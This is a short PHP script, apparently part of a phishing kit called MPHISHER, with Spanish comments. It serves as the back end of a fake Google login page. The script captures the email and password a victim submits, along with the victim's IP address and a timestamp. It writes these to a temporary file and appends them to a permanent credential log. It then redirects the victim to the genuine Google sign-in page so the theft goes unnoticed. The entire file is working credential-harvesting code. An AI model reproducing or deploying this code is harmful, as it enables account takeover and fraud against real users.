<?php
// MPHISHER - Login Capture for Google
// Captura credenciales de login

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? $_POST['username'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';
    $time = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Formato del mensaje
    $data = "=== " . $time . " ===\n";
    $data .= "IP: " . $ip . "\n";
    $data .= "Username: " . $email . "\n";
    $data .= "Pass: " . $password . "\n";
    $data .= "\n";
    
    // Guardar en archivo temporal (para captura en tiempo real)
    $file = fopen("usernames.txt", "w");
    fwrite($file, $data);
    fclose($file);
    
    // Guardar en archivo permanente
    $log = fopen("../../auth/usernames.dat", "a");
    fwrite($log, $data);
    fclose($log);
    
    // Redirigir a Google real
    header("Location: https://accounts.google.com/signin/v2/sl/pwd?flowName=GlifWebSignIn");
    exit();
}
?>
